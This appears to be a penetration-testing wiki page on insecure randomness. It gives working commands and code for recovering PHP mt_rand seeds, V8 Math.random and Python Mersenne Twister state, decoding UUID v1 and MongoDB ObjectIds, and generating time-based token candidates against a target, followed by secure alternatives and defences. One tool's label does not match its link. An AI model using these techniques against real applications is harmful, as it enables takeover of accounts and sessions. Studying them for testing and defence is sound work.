---
title: Insecure randomness — PRNG state recovery and token prediction
slug: insecure-randomness
aliases: [PRNG attacks, GUID prediction, mt_rand recovery, Math.random state, ObjectId prediction]
---

> **TL;DR:** Non-cryptographic PRNGs (Mersenne Twister, V8 xorshift128+, GUID v1) leak internal state through observable outputs. Recovering the state lets you predict every future (and past) token the application generates — password resets, session IDs, OTPs, anything built on the same generator.

## What it is
Most languages ship a fast, non-cryptographic PRNG as the default `random` function. These generators are deterministic: given enough observed outputs, the full internal state can be reconstructed, and every subsequent output predicted. This note covers the concrete recovery techniques per runtime — the companion [[weak-token-generation]] covers the higher-level attack patterns and detection.

## Preconditions / where it applies
- Application tokens built on `Math.random()`, `mt_rand()`, Python `random`, Ruby `rand`, or Java `java.util.Random`.
- GUID/UUID v1 tokens (MAC + timestamp — not random at all).
- MongoDB ObjectIds exposed in API responses (timestamp + machine + PID + counter).
- Any scenario where you can observe multiple outputs from the same PRNG instance.

## Technique

### 1 — PHP `mt_rand()` seed recovery with php_mt_seed

PHP's Mersenne Twister is seeded with a 32-bit value. Observe one or more `mt_rand()` outputs, then brute-force the seed:

```bash
# Compile php_mt_seed (supports PHP 3.0–8.3)
git clone https://github.com/openwall/php_mt_seed
cd php_mt_seed && make

# Single known output (no range)
./php_mt_seed 1328851649

# With min/max range: mt_rand(0, 999999) returned 784571
./php_mt_seed 784571 784571 0 999999
```

Once the seed is recovered, replay the sequence in PHP to predict every token:

```php
mt_srand($recovered_seed);
for ($i = 0; $i < $skip; $i++) mt_rand();  // advance to target position
$predicted_token = mt_rand();
```

**Timing trick:** if the seed is `time()` (common), narrow the brute-force window to the server's clock ± a few seconds.

### 2 — JavaScript `Math.random()` state recovery (V8 xorshift128+)

V8 uses xorshift128+ with a 128-bit state. Given two consecutive `Math.random()` outputs you can recover the full state using Z3 or purpose-built tools:

```python
# z3-based recovery (concept — see v8_rand_buster for full impl)
from z3 import *
s0, s1 = BitVecs('s0 s1', 64)
solver = Solver()

# Each Math.random() = (state0 + state1) >>> 12 | 0x3FF0..., then to double
# Two observed doubles → two constraints → solve
solver.add(observed_bits_0 == (s0 + s1) & 0xFFFFFFFFFFFFF)
# ... (apply xorshift128+ step, add second constraint)
solver.check()
```

Tools: [pwnjs/v8-randomness-predictor](https://github.com/nicknisi/v8-randomness-predictor), `xs128p` module.

**Practical note:** you need outputs from the same V8 isolate (same tab/worker). If the app leaks `Math.random()` in an API response (e.g., cache-buster, request ID), consecutive requests to the same worker thread often hit the same isolate.

### 3 — GUID v1 / UUID v1 timestamp extraction

UUID v1 is not random — it encodes a 60-bit timestamp (100ns intervals since 1582-10-15) and a 48-bit node ID (usually the MAC address):

```python
import uuid

u = uuid.UUID("6ba7b810-9dad-11d1-80b4-00c04fd430c8")
# Extract timestamp (100-ns intervals since 1582-10-15)
print(f"Timestamp: {u.time}")      # 130742845922168000
print(f"Node/MAC:  {u.node:012x}")  # 00c04fd430c8

# Convert to Unix epoch
import datetime
epoch = datetime.datetime(1582, 10, 15)
ts = epoch + datetime.timedelta(microseconds=u.time // 10)
print(f"Generated: {ts}")
```

**Attack:** if password-reset tokens are UUID v1, learn the server's approximate time (from `Date` header) and MAC (from a single leaked UUID), then brute-force the timestamp window — typically < 1 second of candidate UUIDs.

### 4 — MongoDB ObjectId prediction

ObjectId = 4-byte timestamp + 5-byte random (per-process, set once) + 3-byte counter:

```
|-- timestamp --|-- random --|-- counter --|
  4 bytes          5 bytes      3 bytes
```

```python
from bson import ObjectId
import struct

oid = ObjectId("507f1f77bcf86cd799439011")
ts = oid.generation_time  # datetime from first 4 bytes
# Bytes 5–9: machine+process random (constant per process restart)
# Bytes 10–12: incrementing counter

# If you observe two ObjectIds from the same process, you know the random
# bytes and the counter increment rate → predict the next one
```

**Attack scenario:** enumerate other users' ObjectIds if they're sequential and the random bytes are known from any single leaked ID. Common in REST APIs that expose `_id` in responses.

### 5 — Python `random` module (Mersenne Twister) state recovery

Python's `random` module uses MT19937 with a 624 × 32-bit internal state. Observing 624 consecutive 32-bit outputs recovers the full state:

```python
import random
from mt19937predictor import MT19937Predictor  # pip install mt19937predictor

predictor = MT19937Predictor()

# Feed 624 observed 32-bit outputs
for _ in range(624):
    output = get_next_random_from_target()  # observe from the app
    predictor.setrandbits(output, 32)

# Now predict all future outputs
next_value = predictor.getrandbits(32)
```

**Fewer outputs:** if the app calls `random.randint(0, N)`, each call leaks fewer bits, but you can still recover the state — it just takes more observations. The `randcrack` and `mt19937predictor` libraries handle this.

### 6 — Time-based token prediction

When tokens use `time()`, `microtime()`, or `Date.now()` as entropy:

```bash
# Narrow the window using the server's Date header
curl -sI https://target.com | grep -i ^date
# Date: Thu, 05 Nov 2026 12:34:56 GMT

# PHP uniqid() = hex(microtime) — predictable within ~1s window
# Generate candidates for the brute-force
python3 -c "
import time, hashlib
base = int(time.time())
for offset in range(-2, 3):
    for us in range(0, 1000000, 100):  # 100μs steps
        candidate = f'{base+offset}.{us:06d}'
        token = hashlib.md5(candidate.encode()).hexdigest()
        print(token)
" > candidates.txt
```

## Identifying the PRNG in use

| Language   | Insecure default         | Secure alternative            |
|------------|--------------------------|-------------------------------|
| PHP        | `mt_rand()`, `rand()`, `uniqid()` | `random_bytes()`, `random_int()` |
| Python     | `random.random()`        | `secrets.token_hex()`         |
| JavaScript | `Math.random()`          | `crypto.randomBytes()` / `crypto.getRandomValues()` |
| Java       | `java.util.Random`       | `java.security.SecureRandom`  |
| Ruby       | `rand()`                 | `SecureRandom.hex()`          |
| C#         | `System.Random`          | `System.Security.Cryptography.RandomNumberGenerator` |

## Defence
- **Always use the CSPRNG** for anything security-sensitive (tokens, keys, IVs, nonces).
- Use UUID v4 (122 random bits from CSPRNG), never v1 for tokens.
- Never seed with `time()`, PID, or other observable values.
- Rate-limit token generation and redemption endpoints to raise the cost of brute-force.

See also [[weak-token-generation]], [[session-token-analysis]], [[authentication-vulnerabilities]].

## References
- [php_mt_seed](https://www.openwall.com/php_mt_seed/) — brute-force PHP mt_rand seed
- [PortSwigger — Insecure randomness](https://portswigger.net/web-security/authentication/other-mechanisms) — lab coverage
- [MT19937 Predictor](https://github.com/kmyk/mersenne-twister-predictor) — Python state recovery
